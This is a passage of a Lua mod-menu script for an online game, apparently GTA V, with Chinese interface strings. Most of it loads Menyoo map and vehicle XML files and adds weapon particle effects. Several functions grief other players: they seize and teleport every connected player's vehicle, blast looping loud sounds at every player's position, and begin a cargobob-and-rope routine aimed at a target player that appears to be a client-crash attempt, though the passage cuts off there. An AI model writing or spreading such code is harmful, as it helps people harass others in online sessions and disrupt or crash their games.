    local oldcoords = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
   for i = 0, 31 do
       if NETWORK.NETWORK_IS_PLAYER_CONNECTED(i) then
           local ped = PLAYER.GET_PLAYER_PED(i)
           local pedCoords = ENTITY.GET_ENTITY_COORDS(ped)
           for c = 0, 5 do 
               ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pedCoords.x, pedCoords.y, pedCoords.z + 10, false, false, false)
               util.yield(100)
           end
           if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
               local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
               for a = 0, 10 do
                   NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                   ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, 4500, -4400, 4, false, false, false)
                   util.yield(100)
               end
               for b = 0, 10 do
                   ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, 4500, -4400, 4, false, false, false)
               end
           end
       end
   end
   ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), oldcoords.x, oldcoords.y, oldcoords.z, false, false, false)
end
--====mod
function ls_log(content)
    if ls_debug then
        util.toast(content)
        util.log("[LANCESCRIPT RELOADED] " .. content)
    end
end

function request_anim_dict(dict)
    request_time = os.time()
    if not STREAMING.DOES_ANIM_DICT_EXIST(dict) then
        return
    end
    STREAMING.REQUEST_ANIM_DICT(dict)
    while not STREAMING.HAS_ANIM_DICT_LOADED(dict) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end
function request_ptfx_asset(asset)
    local request_time = os.time()
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end
function request_model_load(hash)
    request_time = os.time()
    if not STREAMING.IS_MODEL_VALID(hash) then
        return
    end
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end

function request_ptfx_load(hash)
    request_time = os.time()
    STREAMING.REQUEST_NAMED_PTFX_ASSET(hash)
    while not STREAMING.HAS_PTFX_ASSET_LOADED(hash) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end
function get_waypoint_v3()
    if HUD.IS_WAYPOINT_ACTIVE() then
        local blip = HUD.GET_FIRST_BLIP_INFO_ID(8)
        local waypoint_pos = HUD.GET_BLIP_COORDS(blip)

        local success, Zcoord = util.get_ground_z(waypoint_pos.x, waypoint_pos.y)
        local tries = 0
        while not success or tries <= 100 do
            success, Zcoord = util.get_ground_z(waypoint_pos.x, waypoint_pos.y)
            tries += 1
            util.yield_once()
        end
        if success then
            waypoint_pos.z = Zcoord
        end

        return waypoint_pos
    else
        util.toast("请在地图上标点，谢谢")
    end
end
function REQUEST_CONTROL(entity)
	if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
		local netId = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
		NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, true)
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
	end
	return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity)
end
function GET_NEARBY_VEHICLES(pid, radius) 
	local vehicles = {}
	local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(p)
	local v = PED.GET_VEHICLE_PED_IS_IN(p, false)
	for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do 
		local veh_pos = ENTITY.GET_ENTITY_COORDS(vehicle)
		if vehicle ~= v and vect.dist(pos, veh_pos) <= radius then table.insert(vehicles, vehicle) end
	end
	return vehicles
end
function file_exists(path)
    local file = io.open(path, "rb")
    if file then file:close() end
    return file ~= nil
end

function hasValue( tbl, str )
    local f = false
    for i = 1, #tbl do
        if type( tbl[i] ) == "table" then
            f = hasValue( tbl[i], str )  --  return value from recursion
            if f then break end  --  if it returned true, break out of loop
        elseif tbl[i] == str then
            return true
        end
    end
    return f
end

-- credit to https://stackoverflow.com/questions/1426954/split-string-in-lua
function split_str(inputstr, sep)
    if sep == nil then
            sep = "%s"
    end
    local t={}
    for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
            table.insert(t, str)
    end
    return t
end

function to_boolean(text)
    if text == 'true' or text == "1" then
        return true
    end
    return false
end

function get_element_text(el)
    local pieces = {}
    for _,n in ipairs(el.kids) do
      if n.type=='element' then pieces[#pieces+1] = get_element_text(n)
      elseif n.type=='text' then pieces[#pieces+1] = n.value
      end
    end
    return table.concat(pieces)
end


vehicles_dir = filesystem.scripts_dir() .. '\\CqCqmod\\'.. '\\vehmod\\'--==========lance spooner
if not filesystem.is_dir(vehicles_dir) then
    filesystem.mkdir(vehicles_dir)
end

maps_dir = filesystem.scripts_dir() .. '\\CqCqmod\\'.. '\\mapmod\\'
if not filesystem.is_dir(maps_dir) then
    filesystem.mkdir(maps_dir)
end

function parse_xml(path)
    -- does this path even exist?
    if not file_exists(path) then
        util.toast("是的那个文件不存在了")
        return
    end
    -- break file into string
    local xml = io.open(path):read('*all')
    -- dom that shit ;)
    local dom = slaxdom:dom(xml, {stripWhitespace=true})
    -- return our dominant superior ;)
    return dom
end

function pid_to_handle(pid)
    NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid, handle_ptr, 13)
    return handle_ptr
end


function setup_menyoo_maps_list()
    for i, path in ipairs(filesystem.list_files(maps_dir)) do
        if filesystem.is_dir(path) then
            root = menu.list(menyoom_root, path:gsub(maps_dir, ''), {}, "")
            for i,path in ipairs(filesystem.list_files(path)) do
                menu.action(root, path:gsub(maps_dir, ''), {}, "生成这个地图", function(on_click)
                    menyoo_load_map(path)
                end)
            end
        else
            if string.match(path:gsub(maps_dir, ''), '.xml') then
                menu.action(menyoom_root, path:gsub(maps_dir, ''), {}, "生成这个地图", function(on_click)
                    menyoo_load_map(path)
                end)
            end
        end
    end
end

function menyoo_preprocess_ped(ped, att_data, entity_initial_handles)
    local ped_data = {}
    isped = true
    entity = ped
    menyoo_preprocess_entity(ped, att_data)
    if #entity_initial_handles > 0 then
        entity_initial_handles[att_data['InitialHandle']] = ped
    end
    for a,b in pairs(att_data['PedProperties'].kids) do
        local name = b.name
        local val = get_element_text(b)
        if name == 'PedProps' or name == 'PedComps' or name == 'TaskSequence' then
            ped_data[name] = b 
        else
            ped_data[name] = val
        end
    end
    local task_data = {}
    if att_data['TaskSequence'] ~= nil then
        for a,b in pairs(att_data['TaskSequence'].kids) do
            for c,d in pairs(b.kids) do
                task_data[d.name] = get_element_text(d)
            end
        end
    end
    local props = menyoo_build_properties_table(ped_data['PedProps'].kids)
    for k,v in pairs(props) do
        k = k:gsub('_', '')
        v = split_str(v, ',')
        PED.SET_PED_PROP_INDEX(ped, k, tonumber(v[1]), tonumber(v[2]), true)
    end
    local comps = menyoo_build_properties_table(ped_data['PedComps'].kids)
    for k,v in pairs(comps) do
        k = k:gsub('_', '')
        v = split_str(v, ',')
        PED.SET_PED_COMPONENT_VARIATION(ped, k, tonumber(v[1]), tonumber(v[2]), tonumber(v[2]))
    end
    PED.SET_PED_CAN_RAGDOLL(ped, to_boolean(ped_data['CanRagdoll']))
    PED.SET_PED_ARMOUR(ped, ped_data['Armour'])
    WEAPON.GIVE_WEAPON_TO_PED(ped, ped_data['CurrentWeapon'], 999, false, true)
    -- skipping over relationship groups, fuck that shit, seriously
    -- anim shit
    if task_data['AnimDict'] ~= nil then
        request_anim_dict(task_data['AnimDict'])
        local duration = tonumber(task_data['Duration'])
        local flag = tonumber(task_data['Flag'])
        local speed = tonumber(task_data['Speed'])
        TASK.TASK_PLAY_ANIM(ped, task_data['AnimDict'], task_data['AnimName'], 8.0, 8.0, duration, flag, speed, false, false, false)
    elseif ped_data['AnimDict'] ~= nil then
        request_anim_dict(ped_data['AnimDict'])
        TASK.TASK_PLAY_ANIM(ped, ped_data['AnimDict'], ped_data['AnimName'], 8.0, 8.0, -1, 1, 1.0, false, false, false)
    end
end

function nil_handler(val, default)
    if val == nil then
        val = default
    end
    return val
end

function menyoo_preprocess_entity(entity, data)
    data['Dynamic'] = nil_handler(data['Dynamic'], true)
    data['FrozenPos'] = nil_handler(data['FrozenPos'], true)
    data['OpacityLevel'] = nil_handler(data['OpacityLevel'], 255)
    data['IsInvincible'] = nil_handler(data['IsInvincible'], false)
    data['IsVisible'] = nil_handler(data['IsVisible'], true)
    data['HasGravity'] = nil_handler(data['HasGravity'], false)
    data['IsBulletProof'] = nil_handler(data['IsBulletProof'], false)
    data['IsFireProof'] = nil_handler(data['IsFireProof'], false)
    data['IsExplosionProof'] = nil_handler(data['IsExplosionProof'], false)
    data['IsMeleeProof'] = nil_handler(data['IsMeleeProof'], false)
    ENTITY.FREEZE_ENTITY_POSITION(entity, to_boolean(data['FrozenPos']))
    ENTITY.SET_ENTITY_ALPHA(entity, tonumber(data['OpacityLevel']), false)
    ENTITY.SET_ENTITY_INVINCIBLE(entity, to_boolean(data['IsInvincible']))
    ENTITY.SET_ENTITY_VISIBLE(entity, to_boolean(data['IsVisible']), 0)
    ENTITY.SET_ENTITY_HAS_GRAVITY(entity, to_boolean(data['HasGravity']))
    ENTITY.SET_ENTITY_PROOFS(entity, to_boolean(data['IsBulletProof']), to_boolean(data['IsFireProof']), to_boolean(data['IsExplosionProof']), false, to_boolean(data['IsMeleeProof']), false, true, false)
end

function menyoo_preprocess_car(vehicle, data)
    ls_log("Preprocessing vehicle " .. vehicle)
    local colors = menyoo_build_properties_table(data['Colours'].kids)
    local neons = menyoo_build_properties_table(data['Neons'].kids)
    local doorsopen = menyoo_build_properties_table(data['DoorsOpen'].kids)
    local doorsbroken = menyoo_build_properties_table(data['DoorsBroken'].kids)
    if data['TyresBursted'] ~= nil then
        local tyresbursted = menyoo_build_properties_table(data['TyresBursted'].kids)
        for k,v in pairs(tyresbursted) do
            -- fucking menyoo.. here they go mixing up wheel indexes with strings
            k = k:gsub('_', '')
            local cure_menyoo_aids = {['FrontLeft'] = 0, ['FrontRight'] = 1, [2] = 2, [3] = 3, ['BackLeft'] = 4, ['BackRight'] = 5, [6]=6, [7]=7, [8]=8}
            VEHICLE.SET_VEHICLE_TYRE_BURST(vehicle, cure_menyoo_aids[k], false, 0.0)
        end
    end
    local mods = menyoo_build_properties_table(data['Mods'].kids)
    
    for k,v in pairs(neons) do
        local comp = {['Left']=0, ['Right']=1, ['Front']=2, ['Back']=3}
        VEHICLE._SET_VEHICLE_NEON_LIGHT_ENABLED(vehicle, comp[k], to_boolean(v))
    end

    VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, tonumber(data['WheelType']))
    for k,v in pairs(mods) do
        k = k:gsub('_', '')
        v = split_str(v, ',')
        VEHICLE.SET_VEHICLE_MOD(vehicle, tonumber(k), tonumber(v[1]), to_boolean(v[2]))
    end

    for k,v in pairs(colors) do
        colors[k] = tonumber(v)
    end

    VEHICLE.SET_VEHICLE_COLOURS(vehicle, colors['Primary'], colors['Secondary'])
    VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, colors['Pearl'], colors['Rim'])
    VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, colors['tyreSmoke_R'], colors['tyreSmoke_G'], colors['tyreSmoke_B'])
    VEHICLE._SET_VEHICLE_INTERIOR_COLOR(vehicle, colors['LrInterior'])
    VEHICLE._SET_VEHICLE_DASHBOARD_COLOR(vehicle, colors['LrDashboard'])
    local livery = tonumber(data['Livery'])
    if livery == -1 then
        livery = 0
    end
    VEHICLE.SET_VEHICLE_LIVERY(vehicle, livery)
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, data['NumberPlateText'])
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle, tonumber(data['NumberPlateTextIndex']))
    -- wheel invis here
    -- engine sound name here
    VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, tonumber(data['WindowTint']))
    VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, to_boolean(data['BulletProofTyres']))
    VEHICLE. SET_VEHICLE_DIRT_LEVEL(vehicle, tonumber(data['DirtLevel']))
    VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, tonumber(data['PaintFade']))
    VEHICLE.SET_CONVERTIBLE_ROOF_LATCH_STATE(vehicle, tonumber(data['RoofState']))
    VEHICLE.SET_VEHICLE_SIREN(vehicle, to_boolean(data['SirenActive']))
    VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, to_boolean(data['EngineOn']), true, false)
    -- not sure how to set lights on
    AUDIO.SET_VEHICLE_RADIO_LOUD(vehicle, to_boolean(data['IsRadioLoud']))
    VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, tonumber(data['LockStatus']))
    if data['EngineHealth'] ~= nil then
        VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, tonumber(data['EngineHealth']))
    end
    ls_log("Preprocessing complete for vehicle " .. vehicle)
end

function menyoo_build_properties_table(kids)
    ls_log("Building a menyoo properties table...")
    if kids ~= nil then
        local table = {}
        for k,v in pairs(kids) do
            local name = v.name
            local val = get_element_text(v)
            table[name] = val
        end
        return table
    end
    return nil
end

function menyoo_load_map(path)
    local all_entities = {}
    util.toast("您的地图正在加载。这可能需要一些时间。")
    ls_log("Loading a map from " .. path)
    local entity_initial_handles = {}
    local xml_tbl = parse_xml(path).root
    -- n appears to be the enum of the kid, k is the actual kid table
    local data = {}
    for a,b in pairs(xml_tbl.kids) do
        local vproperties = {}
        local pproperties = {}
        local name = b.name
        local isvehicle = false
        local isped = false
        if name == 'ReferenceCoords' then
            for k,v in pairs(b.kids) do
                if v.name == 'X' then
                    mmblip_x = tonumber(get_element_text(v))
                elseif v.name == 'Y' then
                    mmblip_y = tonumber(get_element_text(v))
                elseif v.name == 'Z' then
                    mmblip_z = tonumber(get_element_text(v))
                end
            end
            mmblip = HUD.ADD_BLIP_FOR_COORD(mmblip_x, mmblip_y, mmblip_z)
            HUD.SET_BLIP_SPRITE(mmblip, 77)
            HUD.SET_BLIP_COLOUR(mmblip, 48)
        end
        if name == 'Placement' then
            for c,d in pairs(b.kids) do
                ls_log(d.name)
                if d.name == 'PositionRotation' then
                    for e, f in pairs(d.kids) do
                        data[f.name] = get_element_text(f)
                    end
                elseif d.name == 'VehicleProperties' then
                    ls_log("vprope")
                    isvehicle = true
                    for n, p in pairs(d.kids) do
                        local prop_name = p.name
                        if prop_name == 'Colours' or prop_name == 'Neons' or prop_name == 'Mods' or prop_name == 'DoorsOpen' or prop_name == 'DoorsBroken' or prop_name == 'TyresBursted' then
                            vproperties[prop_name] = p
                        else
                            vproperties[prop_name]  = get_element_text(p)
                        end
                    end
                elseif d.name == 'PedProperties' then
                    isped = true
                    pproperties[d.name] = d
                else
                    data[d.name] = get_element_text(d)
                end
                ls_log("done")
            end
            mmpos = {}
            mmpos.x = tonumber(data['X'])
            mmpos.y = tonumber(data['Y'])
            mmpos.z = tonumber(data['Z'])
            mmrot = {}
            mmrot.pi = tonumber(data['Pitch'])
            mmrot.ro = tonumber(data['Roll'])
            mmrot.ya = tonumber(data['Yaw'])
            if STREAMING.IS_MODEL_VALID(data['ModelHash']) then
                local mment = 0
                if isvehicle then
                    request_model_load(data['ModelHash'])
                    mment = entities.create_vehicle(data['ModelHash'], mmpos, mmrot.ya)
                    menyoo_preprocess_entity(mment, data)
                    menyoo_preprocess_car(mment, vproperties)
                elseif isped then
                    request_model_load(data['ModelHash'])
                    mment = entities.create_ped(0, data['ModelHash'], mmpos, mmrot.ya)
                    menyoo_preprocess_ped(mment, pproperties, {})
                    menyoo_preprocess_entity(mment, data)
                else
                    request_model_load(data['ModelHash'])
                    mment = entities.create_object(data['ModelHash'], mmpos)
                    menyoo_preprocess_entity(mment, data)
                end
                table.insert(all_entities, mment)
                ENTITY.SET_ENTITY_ROTATION(mment, mmrot.pi, mmrot.ro, mmrot.ya, 2, true)
            else
                util.toast("发现了一些无效模型。确保您没有使用需要mod的XML。")
            end
        end
    end
    mm_maproot = menu.list(menyoomloaded_root, path:gsub(maps_dir, "") .. ' [' .. mmblip .. ']', {"lancescriptmenyooloadedmaps" .. mmblip}, "已加载的地图")
    menu.action(mm_maproot, "传送到地图", {"menyoomteleportto" .. mmblip}, "传送到此地图。", function(on_click)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), mmpos.x, mmpos.y, mmpos.z, false, false, false)
    end)

    menu.action(mm_maproot, "删除地图", {"menyoomdelete" .. mmblip}, "停止它", function(on_click)
        for k,v in pairs(all_entities) do
            entities.delete(v)
        end
        menu.delete(mm_maproot)
        -- apparently remove blip is fucked, so we set sprite to invis as a failsafe
        HUD.SET_BLIP_ALPHA(mmblip, 0)
    end)
    util.toast("地图加载完成。在你的地图上找一个洋红色的L。")
end

local ShootEffect =
{
    scale = 0,
	rotation = nil
}
ShootEffect.__index = ShootEffect
setmetatable(ShootEffect, Effect)

function ShootEffect.new(asset, name, scale, rotation)
	tbl = setmetatable({}, ShootEffect)
	tbl.name = name
	tbl.asset = asset
	tbl.scale = scale or 1.0
	tbl.rotation = rotation or v3.new()
	return tbl
end

local selectedOpt = 1
---@type ShootEffect[]
local shootingEffects <const> = {
	ShootEffect.new("scr_rcbarry2", "muz_clown", 0.8, v3.new(90, 0.0, 0.0)),
	ShootEffect.new("scr_rcbarry2", "scr_clown_bul", 0.3, v3.new(180.0, 0.0, 0.0))
}

function shootingeffect()
    local effect = shootingEffects[selectedOpt]
	if not WIRI.HAS_NAMED_PTFX_ASSET_LOADED(effect.asset) then
		WIRI.REQUEST_NAMED_PTFX_ASSET(effect.asset)

	elseif PED.IS_PED_SHOOTING(players.user_ped()) then
		local weapon = WIRI.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(players.user_ped(), false)
		local boneId = WIRI.GET_ENTITY_BONE_INDEX_BY_NAME(weapon, "gun_muzzle")
		WIRI.USE_PARTICLE_FX_ASSET(effect.asset)
		WIRI.START_PARTICLE_FX_NON_LOOPED_ON_ENTITY_BONE(
			effect.name,
			weapon,
			0.0, 0.0, 0.0,
			effect.rotation.x, effect.rotation.y, effect.rotation.z,
			boneId,
			effect.scale,
			false, false, false
		)
	end
end

function setshootingeffect(index)
    selectedOpt = index
end

local colour <const> = {r = 0, g = 255, b = 255, a = 255}

local HitEffect = {colorCanChange = false}
HitEffect.__index = HitEffect
setmetatable(HitEffect, Effect)

function HitEffect.new(asset, name, colorCanChange)
	local inst = setmetatable({}, HitEffect)
	inst.name = name
	inst.asset = asset
	inst.colorCanChange = colorCanChange or false
	return inst
end
local hitEffects <const> = {
	HitEffect.new("scr_rcbarry2", "scr_exp_clown"),
	HitEffect.new("scr_rcbarry2", "scr_clown_appears"),
	HitEffect.new("scr_rcpaparazzo1", "scr_mich4_firework_trailburst_spawn", true),
	HitEffect.new("scr_indep_fireworks", "scr_indep_firework_starburst", true),
	HitEffect.new("scr_indep_fireworks", "scr_indep_firework_fountain", true),
	HitEffect.new("scr_rcbarry1", "scr_alien_disintegrate"),
	HitEffect.new("scr_rcbarry2", "scr_clown_bul"),
	HitEffect.new("proj_indep_firework", "scr_indep_firework_grd_burst"),
	HitEffect.new("scr_rcbarry2", "muz_clown"),
}


local colour = {r = 1.0, g = 0.0, b = 1.0, a = 1.0}
local timer <const> = newTimer()
local effect <const> = Effect.new("scr_rcpaparazzo1", "scr_mich4_firework_sparkle_spawn")
local effect = {}

---@param effects table
local function removeFxs(effects)
	for _, effect in ipairs(effects) do
		GRAPHICS.STOP_PARTICLE_FX_LOOPED(effect, false)
		GRAPHICS.REMOVE_PARTICLE_FX(effect, false)
	end
end
function shootingeffect()
    local effect = hitEffects[selectedOpt]
	if not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(effect.asset) then
		return STREAMING.REQUEST_NAMED_PTFX_ASSET(effect.asset)
	end

	local hitCoords = v3.new()
	if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(players.user_ped(), memory.addrof(hitCoords)) then
		local raycastResult = get_raycast_result(1000.0)
		local rot = raycastResult.surfaceNormal:toRot()
		GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)

		if effect.colorCanChange then
			local colour = effectColour
			GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
		end
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
			effect.name, hitCoords.x,hitCoords.y,hitCoords.z, rot.x - 90.0, rot.y, rot.z, 1.0, false, false, false, false)
	end
end

function sethiteffect(opt)
    selectedOpt = opt
end

function menyoo_load_vehicle(path, ped, doteleport, ours)
    ls_log("Loading vehicle for ped " .. ped)
    local all_entities = {}
    if ours then
        ls_log("This is ours")
        mvped = PLAYER.PLAYER_PED_ID()
    else
        ls_log("This is theirs")
        mvped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(ped)
    end
    ls_log("Loading a vehicle from " .. path)
    local entity_initial_handles = {}
    local data = {}
    local vproperties = {}
    local xml_tbl = parse_xml(path).root
    -- n appears to be the enum of the kid, k is the actual kid table
    for k,v in pairs(xml_tbl.kids) do
        local name = v.name
        if name == 'VehicleProperties' then
            for n, p in pairs(v.kids) do
                local prop_name = p.name
                if prop_name == 'Colours' or prop_name == 'Neons' or prop_name == 'Mods' or prop_name == 'DoorsOpen' or prop_name == 'DoorsBroken' or prop_name == 'TyresBursted' then
                    vproperties[prop_name] = p
                else
                    vproperties[prop_name]  = get_element_text(p)
                end
            end
        else
            if name == 'SpoonerAttachments' then
                data[name] = v
            else
                local el_text = get_element_text(v)
                data[name] = el_text
            end
        end
    end
    request_model_load(data['ModelHash'])
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(mvped, 0.0, 5.0, 0.0)
    local vehicle = entities.create_vehicle(data['ModelHash'], coords, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
    table.insert(all_entities, vehicle)
    ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
    if doteleport then
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), vehicle, -1)
    end
    if data['InitialHandle'] == nil then
        data['InitialHandle'] = math.random(10000, 30000)
    end
    entity_initial_handles[data['InitialHandle']] = vehicle
    -- apply natives that can apply to any entity
    menyoo_preprocess_entity(vehicle, data)
    menyoo_preprocess_car(vehicle, vproperties)
    -- vehicle-specific natives
    -- now for the attachments...
    local attachments = data['SpoonerAttachments']
    all_attachments = {}
    if attachments ~= nil then
        for a,b in pairs(attachments.kids) do
            local vproperties = {}
            -- each item here should be "attachment" element
            local att_data = {}
            for c,d in pairs(b.kids) do
                local name = d.name
                local val = get_element_text(d)
                if name == 'PedProperties' or name == 'Attachment' or name == 'TaskSequence' then
                    att_data[name] = d
                elseif name == 'VehicleProperties' then
                    for n, p in pairs(d.kids) do
                        local prop_name = p.name
                        if prop_name == 'Colours' or prop_name == 'Neons' or prop_name == 'Mods' or prop_name == 'DoorsOpen' or prop_name == 'DoorsBroken' or prop_name == 'TyresBursted' then
                            vproperties[prop_name] = p
                        else
                            vproperties[prop_name]  = get_element_text(p)
                        end
                    end
                else
                    att_data[name] = val
                end
            end
            request_model_load(att_data['ModelHash'])
            -- 1 = ped, 2 = vehicle, 3 = object
            local attachment_info = menyoo_build_properties_table(att_data['Attachment'].kids)
            local entity = nil
            local isped = false
            if att_data['Type'] == '1' then
                local ped = entities.create_ped(0, att_data['ModelHash'], coords, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
                menyoo_preprocess_ped(ped, att_data, entity_initial_handles)
                entity = ped
            elseif att_data['Type'] == '2' then
                local veh = entities.create_vehicle(att_data['ModelHash'], coords, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
                entity = veh
                menyoo_preprocess_entity(veh, att_data)
                menyoo_preprocess_car(veh, vproperties)
            elseif att_data['Type'] == '3' then
                local obj = entities.create_object(att_data['ModelHash'], coords)
                entity = obj
                menyoo_preprocess_entity(obj, att_data)
                -- obj code
            end
            table.insert(all_entities, entity)
            ENTITY.SET_ENTITY_INVINCIBLE(entity, true)
            local bone = tonumber(attachment_info['BoneIndex'])
            local x = tonumber(attachment_info['X'])
            local y = tonumber(attachment_info['Y'])
            local z = tonumber(attachment_info['Z'])
            local pitch = tonumber(attachment_info['Pitch'])
            local yaw = tonumber(attachment_info['Yaw'])
            local roll = tonumber(attachment_info['Roll'])
            all_attachments[entity] = {}
            all_attachments[entity]['attachedto'] = attachment_info['AttachedTo']
            all_attachments[entity]['bone'] = bone
            all_attachments[entity]['x'] = x
            all_attachments[entity]['y'] = y
            all_attachments[entity]['z'] = z
            all_attachments[entity]['pitch'] = pitch
            all_attachments[entity]['yaw'] = yaw
            all_attachments[entity]['roll'] = roll
            all_attachments[entity]['isped'] = isped
        end
        for k, v in pairs(all_attachments) do
            ENTITY.ATTACH_ENTITY_TO_ENTITY(k, entity_initial_handles[v['attachedto']], v['bone'], v['x'], v['y'], v['z'], v['pitch'], v['roll'], v['yaw'], true, false, true, v['isped'], 2, true)
        end
    end
    ls_log("Vehicle has been loaded.")
    local this_blip = HUD.ADD_BLIP_FOR_ENTITY(vehicle)
    HUD.SET_BLIP_SPRITE(this_blip, 77)
    HUD.SET_BLIP_COLOUR(this_blip, 47)
    local this_veh_root = menu.list(menyoovloaded_root, vehicle .. " [" .. VEHICLE.GET_DISPLAY_NAME_FROM_VEHICLE_MODEL(ENTITY.GET_ENTITY_MODEL(vehicle)) .. "]", {"lancescriptmenyoov" .. vehicle}, "")
    menu.action(this_veh_root, "删除", {"deletemenyoov" .. vehicle}, "删除此车辆", function(on_click)
        for k,v in pairs(all_entities) do
            entities.delete(v)
        end
        menu.delete(this_veh_root)
        HUD.SET_BLIP_ALPHA(this_blip, 0)
    end)
    menu.action(this_veh_root, "传送到载具里", {"teleportemenyoov" .. vehicle}, "骑上它吧", function(on_click)
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), vehicle, -1)
    end)
    return vehicle
end


function allswre()
    local oldcoords = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    for i = 0, 31 do
        if NETWORK.NETWORK_IS_PLAYER_CONNECTED(i) then
            local pped = PLAYER.GET_PLAYER_PED(i)
            local pedCoords = ENTITY.GET_ENTITY_COORDS(pped)
            for c = 0, 5 do 
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pedCoords.x, pedCoords.y, pedCoords.z + 10, false, false, false)
                util.yield(100)
            end
            if PED.IS_PED_IN_ANY_VEHICLE(pped, false) then
                local veh = PED.GET_VEHICLE_PED_IS_IN(pped, false)
                for a = 0, 10 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, -76, -819, 327, false, false, false)
                    util.yield(100)
                end
                for b = 0, 10 do
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, -76, -819, 327, false, false, false)
                end
            end
        end
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), oldcoords.x, oldcoords.y, oldcoords.z, false, false, false)
end
function zaoyin()		
    --{"Bed", "WastedSounds"}
        local pos = v3()
        local Audio_POS = {v3(-73.31681060791,-820.26013183594,326.17517089844),v3(2784.536,5994.213,354.275),v3(-983.292,-2636.995,89.524),v3(1747.518,4814.711,41.666),v3(1625.209,-76.936,166.651),v3(751.179,1245.13,353.832),v3(-1644.193,-1114.271,13.029),v3(462.795,5602.036,781.400),v3(-125.284,6204.561,40.164),v3(2099.765,1766.219,102.698)}
    
        for i = 1, #Audio_POS do
    
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "WastedSounds", true, 999999999, true)
            pos.z = 2000.00
        
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "WastedSounds", true, 999999999, true)
            pos.z = -2000.00
        
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "WastedSounds", true, 999999999, true)
    
            for pid = 0, 31 do
                local pos =	NETWORK._NETWORK_GET_PLAYER_COORDS(pid)
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", pos.x, pos.y, pos.z, "WastedSounds", true, 999999999, true)
            end
       end		
end
function CARGO()
    menu.trigger_commands("anticrashcam on")
    local cspped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TPpos = ENTITY.GET_ENTITY_COORDS(cspped, true)
    local cargobob = CreateVehicle(0XFCFCB68B, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    local cargobobPos = ENTITY.GET_ENTITY_COORDS(cargobob, true)
    local veh = CreateVehicle(0X187D938D, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    local vehPos = ENTITY.GET_ENTITY_COORDS(veh, true)
    local newRope = PHYSICS.ADD_ROPE(TPpos.x, TPpos.y, TPpos.z, 0, 0, 10, 1, 1, 0, 1, 1, false, false, false, 1.0, false, 0)
